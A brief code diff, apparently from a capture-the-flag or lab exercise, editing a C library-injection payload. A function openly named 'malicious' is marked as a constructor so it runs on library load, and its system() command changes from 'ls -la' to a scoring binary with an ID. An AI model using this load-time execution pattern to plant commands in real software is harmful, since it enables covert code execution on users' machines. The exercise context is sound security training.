@@ -7,5 +7,5 @@
 static void malicious() __attribute__((constructor));
 
 void malicious() {
-	system("ls -la");
+	system("/usr/local/bin/score e9386e46-d475-41b0-a058-eaf73474ec1c");
 }
